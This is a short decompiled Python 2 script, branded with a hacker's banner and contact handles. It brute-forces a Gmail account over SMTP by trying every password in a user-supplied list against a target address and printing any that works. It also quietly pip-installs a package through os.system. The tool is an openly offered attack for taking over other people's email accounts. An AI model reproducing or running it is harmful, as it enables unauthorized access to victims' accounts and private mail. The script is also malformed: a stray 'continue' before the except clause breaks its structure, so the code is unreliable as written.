#DECOMPILE BY: SakuraDevOps
import os
os.system('pip install requests')
os.system('clear')
print '\x1b[1;31m     _   _ '
print '    | \\ | | '
print '    |  \\| |   __ _   ___    ___   _ __ '
print "    | . ` |  / _` | / __|  / _ \\ | '__| "
print '    | |\\  | | (_| | \\__ \\ |  __/ | |   '
print '    |_| \\_|  \\__,_| |___/  \\___| |_|    '
print '\x1b[1;33m======================================== '
print '\x1b[1;34m\x1b[1;32m| \x1b[1;93mname\x1b[1;93m: \x1b[1;32mNASER '
print '\x1b[1;34m\x1b[1;32m| \x1b[1;93mCountry\x1b[1;93m: \x1b[1;32mEGYPT '
print '\x1b[1;34m\x1b[1;32m| \x1b[1;93mfacebook\x1b[1;93m: \x1b[1;32mwww.facebook.com/naserEgypt0\x1b[0m \x1b[1;31m '
print '\x1b[1;34m\x1b[1;32m| \x1b[1;93mTelegram\x1b[1;93m: \x1b[1;32mt.me/Anonymous_Hack_12 '
print '\x1b[1;33m========================================'
import smtplib
smtpserver = smtplib.SMTP('smtp.gmail.com', 587)
smtpserver.ehlo()
smtpserver.starttls()
user = raw_input('Enter emai HACKING >> ')
passwfile = raw_input('Enter passlist >> ')
passwfile = open(passwfile, 'r')
for password in passwfile:
    
    try:
        smtpserver.login(user, password)
        print '[+] Password Found:%s' % password
    continue
    except smtplib.SMTPAuthenticationError:
        print '[!] Password Incorrect: %s' % password
        continue
    


